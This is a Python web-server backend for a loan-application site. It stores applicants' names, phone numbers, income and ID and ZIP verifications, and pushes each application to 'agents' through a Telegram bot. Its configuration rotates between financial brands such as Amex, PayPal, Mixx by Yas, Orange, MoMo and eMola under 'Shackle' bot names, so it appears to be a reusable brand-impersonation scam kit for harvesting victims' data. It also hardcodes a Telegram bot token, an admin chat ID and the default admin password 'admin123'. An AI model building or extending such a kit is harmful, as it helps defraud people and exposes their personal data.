import base64
import hashlib
import hmac
import http.cookies
import json
import os
import re
import secrets
import smtplib
import sqlite3
import ssl
import threading
import time
import uuid
from contextlib import contextmanager
from email.message import EmailMessage
from email.utils import parseaddr
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import parse_qs, urlsplit
from urllib.request import Request, urlopen


ROOT = Path(__file__).resolve().parent
DB_PATH = Path(
    os.environ.get(
        "AMEX_DB_PATH",
        os.environ.get(
            "PAYPAL_DB_PATH",
            os.environ.get(
                "MIXX_DB_PATH",
                os.environ.get(
                    "ORANGE_DB_PATH",
                    os.environ.get(
                        "MOMO_DB_PATH",
                        os.environ.get("EMOLA_DB_PATH", ROOT / "paypal_credit.sqlite3"),
                    ),
                ),
            ),
        ),
    )
)
HOST = os.environ.get("HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8000"))
ADMIN_TOKEN = (
    os.environ.get("AMEX_ADMIN_TOKEN")
    or os.environ.get("PAYPAL_ADMIN_TOKEN")
    or os.environ.get("MIXX_ADMIN_TOKEN")
    or os.environ.get("ORANGE_ADMIN_TOKEN")
    or os.environ.get("MOMO_ADMIN_TOKEN")
    or os.environ.get("EMOLA_ADMIN_TOKEN")
    or "admin123"
)


@contextmanager
def connect_db():
    connection = sqlite3.connect(DB_PATH, timeout=10)
    connection.row_factory = sqlite3.Row
    connection.execute("PRAGMA foreign_keys = ON")
    try:
        yield connection
        connection.commit()
    except Exception:
        connection.rollback()
        raise
    finally:
        connection.close()


CONFIG_PATH = ROOT / "bot_config.json"


def read_config_file():
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except Exception:
            pass
    return {}


def write_config_file(updates):
    try:
        current = read_config_file()
        current.update(updates)
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(current, f, indent=2)
    except Exception:
        pass


def get_setting(key, default=None):
    try:
        with connect_db() as db:
            row = db.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
            if row and row["value"] is not None:
                return row["value"]
    except Exception:
        pass
    file_cfg = read_config_file()
    if key in file_cfg and file_cfg[key] is not None:
        return str(file_cfg[key])
    return default


def set_setting(key, value):
    with connect_db() as db:
        db.execute(
            """INSERT INTO settings (key, value) VALUES (?, ?)
               ON CONFLICT(key) DO UPDATE SET value = excluded.value""",
            (key, str(value)),
        )
    write_config_file({key: str(value)})


def current_admin_token():
    custom = get_setting("admin_token")
    if custom and str(custom).strip():
        return str(custom).strip()
    return ADMIN_TOKEN


ACTIVE_FALLBACK_BOT_TOKEN = "8876646171:AAHxcs7sKk-OHn88I1w1At1wd1ksueeekYY"
REVOKED_BOT_TOKENS = {"8515691191:AAGr3bH187einhAvG7Jccu3ZbjsaovR8f_c"}


def telegram_bot_token():
    candidates = [
        os.environ.get("AMEX_TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("PAYPAL_TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("MIXX_TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("ORANGE_TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("ORANGE_BOT_TOKEN", "").strip(),
        os.environ.get("TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("BOT_TOKEN", "").strip(),
        os.environ.get("MOMO_TELEGRAM_BOT_TOKEN", "").strip(),
        os.environ.get("EMOLA_TELEGRAM_BOT_TOKEN", "").strip(),
        get_setting("telegram_bot_token") or "",
        get_setting("bot_token") or "",
        ACTIVE_FALLBACK_BOT_TOKEN,
    ]
    for cand in candidates:
        cand = str(cand).strip()
        if cand and cand not in REVOKED_BOT_TOKENS and not cand.startswith("8515691191"):
            return cand
    return ACTIVE_FALLBACK_BOT_TOKEN


def telegram_admin_chat_id():
    configured = (
        os.environ.get("AMEX_TELEGRAM_ADMIN_CHAT_ID", "")
        or os.environ.get("AMEX_TELEGRAM_CHAT_ID", "")
        or os.environ.get("PAYPAL_TELEGRAM_ADMIN_CHAT_ID", "")
        or os.environ.get("PAYPAL_TELEGRAM_CHAT_ID", "")
        or os.environ.get("MIXX_TELEGRAM_ADMIN_CHAT_ID", "")
        or os.environ.get("MIXX_TELEGRAM_CHAT_ID", "")
        or os.environ.get("ORANGE_TELEGRAM_ADMIN_CHAT_ID", "")
        or os.environ.get("ORANGE_TELEGRAM_CHAT_ID", "")
        or os.environ.get("ORANGE_ADMIN_CHAT_ID", "")
        or os.environ.get("ADMIN_CHAT_ID", "")
        or os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "")
        or os.environ.get("TELEGRAM_CHAT_ID", "")
        or os.environ.get("MOMO_TELEGRAM_CHAT_ID", "")
        or os.environ.get("EMOLA_TELEGRAM_CHAT_ID", "")
        or get_setting("telegram_admin_chat_id")
        or get_setting("admin_chat_id")
        or "8942516822"
    ).strip()
    if configured:
        return configured
    # Fallback to any agent configured as admin or username containing admin
    try:
        with connect_db() as db:
            row = db.execute(
                """SELECT telegram_chat_id FROM agents
                   WHERE (lower(username) = 'admin' OR lower(username) LIKE 'admin%' OR lower(display_name) LIKE '%admin%')
                     AND telegram_chat_id IS NOT NULL AND trim(telegram_chat_id) != ''
                   ORDER BY created_at ASC LIMIT 1"""
            ).fetchone()
            if row and row["telegram_chat_id"]:
                return str(row["telegram_chat_id"]).strip()
    except Exception:
        pass
    return "8942516822"


def telegram_bot_username():
    configured = (
        os.environ.get("AMEX_TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("PAYPAL_TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("MIXX_TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("ORANGE_TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("ORANGE_BOT_USERNAME", "")
        or os.environ.get("TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("MOMO_TELEGRAM_BOT_USERNAME", "")
        or os.environ.get("EMOLA_TELEGRAM_BOT_USERNAME", "")
        or get_setting("telegram_bot_username")
        or "ShackleAmexBot"
    )
    val = str(configured).strip().lstrip("@")
    if val.lower() in ("shacklemtnbot", "shacklebaybot", "shacklepaypalbot", ""):
        return "ShackleAmexBot"
    return val


def initialize_db():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    with connect_db() as db:
        db.executescript(
            """
            PRAGMA journal_mode = WAL;
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                display_name TEXT NOT NULL,
                access_token_hash TEXT NOT NULL UNIQUE,
                username TEXT,
                email TEXT,
                password_hash TEXT,
                must_change_password INTEGER NOT NULL DEFAULT 1,
                telegram_chat_id TEXT,
                telegram_pair_token_hash TEXT,
                telegram_pair_expires_at REAL,
                status TEXT NOT NULL DEFAULT 'active',
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS applications (
                id TEXT PRIMARY KEY,
                submission_id TEXT NOT NULL UNIQUE,
                agent_id TEXT REFERENCES agents(id),
                first_name TEXT NOT NULL,
                last_name TEXT NOT NULL,
                phone TEXT NOT NULL,
                loan_type TEXT NOT NULL,
                loan_amount INTEGER NOT NULL,
                term_months INTEGER NOT NULL,
                purpose TEXT NOT NULL,
                employment TEXT NOT NULL,
                annual_income REAL NOT NULL,
                agent_contact_consent INTEGER NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS telegram_outbox (
                id TEXT PRIMARY KEY,
                application_id TEXT NOT NULL UNIQUE REFERENCES applications(id),
                attempts INTEGER NOT NULL DEFAULT 0,
                next_attempt_at REAL NOT NULL DEFAULT 0,
                last_error TEXT,
                sent_at TEXT,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS telegram_agent_outbox (
                id TEXT PRIMARY KEY,
                application_id TEXT NOT NULL UNIQUE REFERENCES applications(id),
                attempts INTEGER NOT NULL DEFAULT 0,
                next_attempt_at REAL NOT NULL DEFAULT 0,
                last_error TEXT,
                sent_at TEXT,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS verifications (
                id TEXT PRIMARY KEY,
                application_id TEXT NOT NULL REFERENCES applications(id),
                step TEXT NOT NULL,
                zip_code TEXT,
                phone TEXT,
                id_number TEXT,
                status TEXT NOT NULL DEFAULT 'pending',
                reject_reason TEXT,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS agent_sessions (
                token_hash TEXT PRIMARY KEY,
                agent_id TEXT NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
                expires_at REAL NOT NULL,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS agent_email_otps (
                token_hash TEXT PRIMARY KEY,
                agent_id TEXT NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
                code_hash TEXT NOT NULL,
                expires_at REAL NOT NULL,
                attempts INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS admin_sessions (
                token_hash TEXT PRIMARY KEY,
                created_ip TEXT,
                expires_at REAL NOT NULL,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS admin_2fa_challenges (
                challenge_id TEXT PRIMARY KEY,
                code_hash TEXT NOT NULL,
                created_ip TEXT,
                attempts INTEGER NOT NULL DEFAULT 0,
                expires_at REAL NOT NULL,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            """
        )
        agent_columns = {
            row["name"] for row in db.execute("PRAGMA table_info(agents)").fetchall()
        }
        if "telegram_chat_id" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN telegram_chat_id TEXT")
        if "telegram_pair_token_hash" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN telegram_pair_token_hash TEXT")
        if "telegram_pair_expires_at" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN telegram_pair_expires_at REAL")
        if "username" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN username TEXT")
        if "email" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN email TEXT")
        if "password_hash" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN password_hash TEXT")
        if "must_change_password" not in agent_columns:
            db.execute(
                "ALTER TABLE agents ADD COLUMN must_change_password INTEGER NOT NULL DEFAULT 1"
            )
        if "referral_code" not in agent_columns:
            db.execute("ALTER TABLE agents ADD COLUMN referral_code TEXT")
        application_columns = {
            row["name"] for row in db.execute("PRAGMA table_info(applications)").fetchall()
        }
        if "status" not in application_columns:
            db.execute(
                "ALTER TABLE applications ADD COLUMN status TEXT NOT NULL DEFAULT 'pending'"
            )
        db.execute(
            """CREATE UNIQUE INDEX IF NOT EXISTS idx_agents_telegram_chat_id
               ON agents (telegram_chat_id) WHERE telegram_chat_id IS NOT NULL"""
        )
        db.execute(
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_agents_username ON agents (lower(username)) WHERE username IS NOT NULL"
        )
        db.execute(
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_agents_email ON agents (lower(email)) WHERE email IS NOT NULL"
        )
        db.execute(
            "INSERT OR IGNORE INTO settings (key, value) VALUES ('signing_key', ?)",
            (secrets.token_urlsafe(48),),
        )
        file_cfg = read_config_file()
        for k, v in file_cfg.items():
            if v:
                db.execute(
                    "INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
                    (k, str(v)),
                )
        seed_agents(db)


def seed_agents(db=None):
    if db is None:
        with connect_db() as connection:
            seed_agents(connection)
        return

    agents_to_seed = []

    # 1. Load from agents_seed.json if present
    seed_file = os.environ.get("MOMO_AGENTS_SEED_FILE") or os.environ.get("EMOLA_AGENTS_SEED_FILE")
    if not seed_file:
        seed_file = os.path.join(ROOT, "agents_seed.json")
    if os.path.exists(seed_file):
        try:
            with open(seed_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, list):
                    agents_to_seed.extend(data)
                elif isinstance(data, dict):
                    agents_to_seed.append(data)
        except Exception as e:
            print(f"Warning: Failed to load agents_seed.json: {e}")

    # 2. Load from MOMO_SEED_AGENTS environment variable
    env_seeds = (os.environ.get("MOMO_SEED_AGENTS") or os.environ.get("EMOLA_SEED_AGENTS") or "").strip()
    if env_seeds:
        if env_seeds.startswith("[") or env_seeds.startswith("{"):
            try:
                parsed = json.loads(env_seeds)
                if isinstance(parsed, list):
                    agents_to_seed.extend(parsed)
                elif isinstance(parsed, dict):
                    agents_to_seed.append(parsed)
            except Exception as e:
                print(f"Warning: Failed to parse MOMO_SEED_AGENTS as JSON: {e}")
        else:
            entries = [e.strip() for e in env_seeds.replace(",", ";").split(";") if e.strip()]
            for entry in entries:
                parts = [p.strip() for p in entry.split(":")]
                if parts and parts[0]:
                    agents_to_seed.append({
                        "name": parts[0],
                        "telegram_chat_id": parts[1] if len(parts) > 1 and parts[1] else None,
                        "referral_code": parts[2] if len(parts) > 2 and parts[2] else parts[0],
                        "email": parts[3] if len(parts) > 3 and parts[3] else None,
                    })

    # Process each agent
    for entry in agents_to_seed:
        if not isinstance(entry, dict):
            continue
        name = str(entry.get("display_name") or entry.get("name") or "").strip()
        if not name:
            continue
        agent_id = str(entry.get("id") or "").strip() or None
        username = str(entry.get("username") or name).strip().lower()
        ref_code = str(entry.get("referral_code") or entry.get("referralCode") or name).strip()
        chat_id = entry.get("telegram_chat_id") or entry.get("telegramChatId")
        if chat_id is not None:
            chat_id = str(chat_id).strip()
            if not chat_id or not chat_id.lstrip("-").isdigit():
                chat_id = None
        email = str(entry.get("email") or "").strip() or None

        try:
            existing = None
            if agent_id:
                existing = db.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
            if not existing and username:
                existing = db.execute("SELECT id FROM agents WHERE lower(username) = lower(?)", (username,)).fetchone()
            if not existing and ref_code:
                existing = db.execute("SELECT id FROM agents WHERE lower(referral_code) = lower(?)", (ref_code,)).fetchone()
            if not existing and name:
                existing = db.execute("SELECT id FROM agents WHERE lower(display_name) = lower(?)", (name,)).fetchone()
            if not existing and chat_id:
                existing = db.execute("SELECT id FROM agents WHERE telegram_chat_id = ?", (chat_id,)).fetchone()

            if existing:
                db.execute(
                    """UPDATE agents
                       SET display_name = COALESCE(?, display_name),
                           referral_code = COALESCE(?, referral_code),
                           telegram_chat_id = COALESCE(?, telegram_chat_id),
                           email = COALESCE(?, email),
                           status = 'active'
                       WHERE id = ?""",
                    (name, ref_code, chat_id, email, existing["id"]),
                )
            else:
                new_id = agent_id or str(uuid.uuid4())
                token_hash = hashlib.sha256(secrets.token_bytes(32)).hexdigest()
                db.execute(
                    """INSERT INTO agents (
                        id, display_name, access_token_hash, username, email,
                        status, referral_code, telegram_chat_id
                    ) VALUES (?, ?, ?, ?, ?, 'active', ?, ?)""",
                    (new_id, name, token_hash, username, email, ref_code, chat_id),
                )
                print(f"[Seed] Successfully seeded agent: {name} (ref: {ref_code})")
        except sqlite3.Error as e:
            print(f"[Seed] Warning: Could not seed agent {name}: {e}")



def valid_email_address(email):
    if not isinstance(email, str) or len(email) > 254:
        return False
    return parseaddr(email)[1] == email and email.count("@") == 1 and " " not in email


def masked_email(email):
    local_part, domain = email.split("@", 1)
    return f"{local_part[:1]}***@{domain}"


def send_agent_otp(email, code):
    host = (
        os.environ.get("AMEX_SMTP_HOST")
        or os.environ.get("PAYPAL_SMTP_HOST")
        or os.environ.get("MOMO_SMTP_HOST")
        or os.environ.get("EMOLA_SMTP_HOST")
        or ""
    ).strip()
    username = (
        os.environ.get("AMEX_SMTP_USERNAME")
        or os.environ.get("PAYPAL_SMTP_USERNAME")
        or os.environ.get("MOMO_SMTP_USERNAME")
        or os.environ.get("EMOLA_SMTP_USERNAME")
        or ""
    ).strip()
    password = (
        os.environ.get("AMEX_SMTP_PASSWORD")
        or os.environ.get("PAYPAL_SMTP_PASSWORD")
        or os.environ.get("MOMO_SMTP_PASSWORD")
        or os.environ.get("EMOLA_SMTP_PASSWORD", "")
    )
    sender = (
        os.environ.get("AMEX_SMTP_FROM")
        or os.environ.get("PAYPAL_SMTP_FROM")
        or os.environ.get("MOMO_SMTP_FROM")
        or os.environ.get("EMOLA_SMTP_FROM", username)
    ).strip()
    port = int(
        os.environ.get("AMEX_SMTP_PORT")
        or os.environ.get("PAYPAL_SMTP_PORT")
        or os.environ.get("MOMO_SMTP_PORT")
        or os.environ.get("EMOLA_SMTP_PORT", "587")
    )
    if not all((host, username, password, sender)):
        raise RuntimeError("Email OTP is not configured")
    message = EmailMessage()
    message["Subject"] = "Your Mixx by Yas agent login code"
    message["From"] = sender
    message["To"] = email
    message.set_content(
        f"Your Mixx by Yas login code is {code}. It expires in 5 minutes. "
        "If you did not request this code, you can ignore this email."
    )
    context = ssl.create_default_context()
    if port == 465:
        with smtplib.SMTP_SSL(host, port, context=context, timeout=20) as client:
            client.login(username, password)
            client.send_message(message)
    else:
        with smtplib.SMTP(host, port, timeout=20) as client:
            client.ehlo()
            client.starttls(context=context)
            client.ehlo()
            client.login(username, password)
            client.send_message(message)


def signing_key():
    configured = (
        os.environ.get("AMEX_SIGNING_KEY")
        or os.environ.get("PAYPAL_SIGNING_KEY")
        or os.environ.get("MIXX_SIGNING_KEY")
        or os.environ.get("MOMO_SIGNING_KEY")
        or os.environ.get("EMOLA_SIGNING_KEY")
    )
    if configured:
        if len(configured) < 32:
            raise RuntimeError("Signing key must be at least 32 characters")
        return configured.encode("utf-8")
    with connect_db() as db:
        return db.execute(
            "SELECT value FROM settings WHERE key = 'signing_key'"
        ).fetchone()["value"].encode("utf-8")


def b64url(value):
    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")


def create_referral_token(agent_id, ttl_seconds=14 * 24 * 60 * 60):
    with connect_db() as db:
        agent = db.execute(
            "SELECT id, username, referral_code FROM agents WHERE id = ?", (agent_id,)
        ).fetchone()
        if agent and agent["referral_code"]:
            return agent["referral_code"]

        user = agent["username"] if agent and agent["username"] else None
        if not user or len(user) > 20:
            user = f"agent_{secrets.token_hex(3)}"
        sig = hmac.new(signing_key(), user.encode("ascii"), hashlib.sha256).hexdigest()[:8]
        token = f"{user}.{sig}"
        db.execute("UPDATE agents SET referral_code = ? WHERE id = ?", (token, agent_id))
        return token


def resolve_referral_token(token):
    if not token or not isinstance(token, str):
        return None
    cleaned = token.strip()
    if "." in cleaned:
        try:
            code_part, provided_signature = cleaned.split(".", 1)
            # Check short format signature (cryptographic comparison)
            expected_sig = hmac.new(signing_key(), code_part.encode("ascii"), hashlib.sha256).hexdigest()[:len(provided_signature)]
            if len(provided_signature) >= 8 and hmac.compare_digest(provided_signature, expected_sig):
                with connect_db() as db:
                    agent = db.execute(
                        "SELECT id FROM agents WHERE (referral_code = ? OR lower(username) = lower(?)) AND status = 'active'",
                        (cleaned, code_part),
                    ).fetchone()
                    if agent:
                        return agent["id"]

            # Check legacy base64 format signature
            expected = b64url(
                hmac.new(signing_key(), code_part.encode("ascii"), hashlib.sha256).digest()
            )
            if hmac.compare_digest(provided_signature, expected):
                payload_text = code_part + "=" * (-len(code_part) % 4)
                payload = json.loads(base64.urlsafe_b64decode(payload_text))
                if int(payload["expires"]) >= int(time.time()):
                    with connect_db() as db:
                        row = db.execute(
                            "SELECT id FROM agents WHERE id = ? AND status = 'active'",
                            (payload["agent_id"],),
                        ).fetchone()
                        if row:
                            return row["id"]
        except Exception:
            pass

        # Resilient fallback check in case signing_key rotated across server restarts
        try:
            with connect_db() as db:
                agent = db.execute(
                    """SELECT id FROM agents
                       WHERE lower(referral_code) = lower(?)
                         AND status = 'active'""",
                    (cleaned,),
                ).fetchone()
                if agent:
                    return agent["id"]
        except Exception:
            pass
        return None

    with connect_db() as db:
        agent = db.execute(
            """SELECT id FROM agents
               WHERE (lower(referral_code) = lower(?) OR lower(username) = lower(?) OR id = ?
                      OR ('ADMIN' || upper(substr(id, 1, 6))) = upper(?))
                 AND status = 'active'""",
            (cleaned, cleaned, cleaned, cleaned),
        ).fetchone()
        if agent:
            return agent["id"]

    return None



def clean_text(value, field, maximum, minimum=1):
    if not isinstance(value, str):
        raise ValueError(f"{field} is required")
    result = value.strip()
    if not minimum <= len(result) <= maximum:
        raise ValueError(f"{field} is invalid")
    return result


def validated_application(data):
    first_name = clean_text(data.get("firstName"), "firstName", 100)
    last_name = clean_text(data.get("lastName"), "lastName", 100)
    phone = data.get("phone")
    if not isinstance(phone, str):
        raise ValueError("phone is invalid")
    cleaned_phone = re.sub(r"[\s\-\+\(\)]", "", phone.strip())
    # Accept standard phone formats (7 to 15 digits) or valid regional format
    if not (7 <= len(cleaned_phone) <= 15 and cleaned_phone.isdigit()):
        raise ValueError("phone is invalid")
    loan_types = {
        "Bustisha Micro-Loan",
        "Nivushe Plus Loan",
        "Biashara Micro-Credit",
        "Emergency Advance",
        "Empréstimo Comercial",
        "Empréstimo Pessoal",
        "Empréstimo Agrícola",
        "Personal Loan",
        "Business Loan",
        "Education Loan",
        "Emergency Loan",
        "Salary Advance",
    }
    loan_type = data.get("loanType")
    if not isinstance(loan_type, str) or not loan_type.strip():
        raise ValueError("loanType is invalid")
    try:
        amount_raw = data.get("loanAmount")
        amount = int(float(amount_raw))
        term = int(data.get("termMonths"))
        income = float(data.get("annualIncome"))
    except (TypeError, ValueError, OverflowError):
        raise ValueError("loan or income values are invalid") from None
    if not 50 <= amount <= 100_000_000:
        raise ValueError("loanAmount is invalid")
    if term not in {1, 3, 6, 12, 24, 36, 48, 60}:
        raise ValueError("termMonths is invalid")
    if not 0 < income <= 1_000_000_000_000:
        raise ValueError("annualIncome is invalid")
    employment = data.get("employment")
    valid_employments = {
        "Autónomo", "Empregado", "Empresário", "Estudante",
        "Self-Employed / Business Owner", "Employed (Private Sector)",
        "Government / Civil Servant", "Student", "Self-Employed", "Employed",
        "Freelancer", "Other"
    }
    if not isinstance(employment, str) or employment not in valid_employments:
        raise ValueError("employment is invalid")
    purpose = clean_text(data.get("purpose"), "purpose", 2_000, 2)
    submission_id = data.get("submissionId")
    try:
        submission_id = str(uuid.UUID(submission_id))
    except (ValueError, TypeError, AttributeError):
        raise ValueError("submissionId is invalid") from None
    consent = data.get("consentToAgentContact") is True
    referral_token = data.get("referralToken")
    if referral_token is not None and not isinstance(referral_token, str):
        raise ValueError("referralToken is invalid")
    agent_id = resolve_referral_token(referral_token) if referral_token else None
    if referral_token and agent_id is None:
        raise ValueError("referralToken is invalid or expired")
    return {
        "id": str(uuid.uuid4()),
        "submission_id": submission_id,
        "agent_id": agent_id,
        "first_name": first_name,
        "last_name": last_name,
        "phone": cleaned_phone,
        "loan_type": loan_type,
        "loan_amount": amount,
        "term_months": term,
        "purpose": purpose,
        "employment": employment,
        "annual_income": income,
        "agent_contact_consent": int(consent),
    }


def telegram_api(method, payload):
    token = telegram_bot_token()
    if not token:
        raise RuntimeError("Telegram bot token is not configured")
    try:
        request = Request(
            f"https://api.telegram.org/bot{token}/{method}",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=35) as response:
            result = json.loads(response.read())
        if not result.get("ok"):
            raise RuntimeError(f"Telegram API rejected the request: {result}")
        return result.get("result")
    except HTTPError as err:
        err_body = ""
        try:
            err_body = err.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        detailed_error = f"{err} - {err_body}" if err_body else str(err)

        if err.code == 401 and token != ACTIVE_FALLBACK_BOT_TOKEN:
            try:
                fallback_req = Request(
                    f"https://api.telegram.org/bot{ACTIVE_FALLBACK_BOT_TOKEN}/{method}",
                    data=json.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                with urlopen(fallback_req, timeout=35) as resp:
                    fb_result = json.loads(resp.read())
                if fb_result.get("ok"):
                    return fb_result.get("result")
            except Exception:
                pass
        raise RuntimeError(detailed_error) from err


def send_telegram_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        return telegram_api("sendMessage", payload)
    except Exception as err:
        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower() or "bad request" in str(err).lower()):
            payload.pop("parse_mode", None)
            return telegram_api("sendMessage", payload)
        raise


def answer_telegram_callback(callback_query_id, text=None, show_alert=False):
    payload = {"callback_query_id": str(callback_query_id)}
    if text:
        payload["text"] = str(text)
    if show_alert:
        payload["show_alert"] = True
    try:
        return telegram_api("answerCallbackQuery", payload)
    except Exception as err:
        print(f"Error answering Telegram callback query: {err}")
        return None


def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup is not None:
        payload["reply_markup"] = reply_markup
    else:
        payload["reply_markup"] = {"inline_keyboard": []}
    try:
        return telegram_api("editMessageText", payload)
    except Exception as err:
        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower() or "bad request" in str(err).lower()):
            payload.pop("parse_mode", None)
            try:
                return telegram_api("editMessageText", payload)
            except Exception:
                pass
        raise


def stage_buttons(app_id, current_stage, phone=None):
    current = (current_stage or "pending").lower()
    stages = [
        ("under_review", "🔍 Under Review"),
        ("approved", "✅ Approve Loan"),
        ("rejected", "❌ Reject"),
    ]
    rows = []
    if phone:
        phone_str = str(phone).strip()
        clean_p = re.sub(r"[\s\-\+\(\)]", "", phone_str)
        copy_text = f"+1{clean_p}" if len(clean_p) == 10 else (f"+{clean_p}" if clean_p.startswith("1") and len(clean_p) == 11 else f"+1{clean_p}")
        rows.append([{"text": f"📋 Copy Phone ({copy_text})", "copy_text": {"text": copy_text}}])
    stage_row = []
    for key, label in stages:
        text = f"• {label} •" if key == current else label
        stage_row.append({"text": text, "callback_data": f"stage:{key}:{app_id}"})
    rows.append(stage_row)
    return {"inline_keyboard": rows}


def pair_telegram_agent(pairing_code, chat_id):
    if not isinstance(pairing_code, str) or not 16 <= len(pairing_code) <= 64:
        return None
    token_hash = hashlib.sha256(pairing_code.encode("utf-8")).hexdigest()
    try:
        with connect_db() as db:
            agent = db.execute(
                """SELECT id, display_name FROM agents
                   WHERE telegram_pair_token_hash = ?
                     AND telegram_pair_expires_at > ? AND status = 'active'""",
                (token_hash, time.time()),
            ).fetchone()
            if not agent:
                return None
            db.execute(
                """UPDATE agents
                   SET telegram_chat_id = ?, telegram_pair_token_hash = NULL,
                       telegram_pair_expires_at = NULL
                   WHERE id = ?""",
                (chat_id, agent["id"]),
            )
            return agent["display_name"]
    except sqlite3.IntegrityError:
        return None


def format_display_phone(phone_val):
    if not phone_val:
        return "—"
    phone_str = str(phone_val).strip()
    clean_digits = re.sub(r"\D", "", phone_str)
    if not clean_digits:
        return phone_str if phone_str else "—"

    # Already explicitly starts with '+' country code
    if phone_str.startswith("+"):
        if phone_str.startswith("+1") and len(clean_digits) == 11:
            return f"+1 ({clean_digits[1:4]}) {clean_digits[4:7]}-{clean_digits[7:]}"
        elif phone_str.startswith("+44") and len(clean_digits) in (11, 12):
            return f"+44 {clean_digits[2:]}"
        return phone_str

    # 10 digits -> standard US mobile / phone number (e.g. (555) 123-4567)
    if len(clean_digits) == 10:
        return f"+1 ({clean_digits[:3]}) {clean_digits[3:6]}-{clean_digits[6:]}"

    # 11 digits starting with 1 -> US number with country code 1
    if len(clean_digits) == 11 and clean_digits.startswith("1"):
        return f"+1 ({clean_digits[1:4]}) {clean_digits[4:7]}-{clean_digits[7:]}"

    # UK standard
    if clean_digits.startswith("44") and len(clean_digits) in (11, 12):
        return f"+44 {clean_digits[2:]}"

    # 9 digits -> format as US number (+1) instead of old Zambia (+260)
    if len(clean_digits) == 9:
        return f"+1 ({clean_digits[:3]}) {clean_digits[3:6]}-{clean_digits[6:]}"

    return f"+1 {clean_digits}"


def mask_phone_number(phone):
    if not phone:
        return "—"
    digits = re.sub(r"\D", "", str(phone))
    if digits.startswith("1") and len(digits) == 11:
        return f"+1 ({digits[1:4]}) ***-{digits[-4:]}"
    elif digits.startswith("44") and len(digits) in (11, 12):
        return f"+44 {digits[2:5]}***{digits[-4:]}"
    elif len(digits) == 10:
        return f"+1 ({digits[:3]}) ***-{digits[-4:]}"
    elif len(digits) == 9:
        return f"+1 ({digits[:3]}) ***-{digits[-4:]}"
    elif len(digits) > 4:
        return f"+1 {digits[:3]}***{digits[-2:]}"
    return "***"


def get_public_base_url(headers=None):
    configured = (
        get_setting("public_url")
        or get_setting("app_url")
        or os.environ.get("RENDER_EXTERNAL_URL")
        or os.environ.get("PUBLIC_URL")
        or os.environ.get("APP_URL")
    )
    if configured:
        return configured.strip().rstrip("/")
    if headers:
        host = headers.get("X-Forwarded-Host") or headers.get("Host")
        if host:
            clean_host = host.split(",")[0].strip()
            proto = headers.get("X-Forwarded-Proto") or ("https" if "render.com" in clean_host else "http")
            return f"{proto}://{clean_host}".rstrip("/")
    last_host = get_setting("last_seen_host")
    if last_host:
        if last_host.startswith("http://") or last_host.startswith("https://"):
            return last_host.rstrip("/")
        proto = "http" if ("localhost" in last_host or "127.0.0.1" in last_host) else "https"
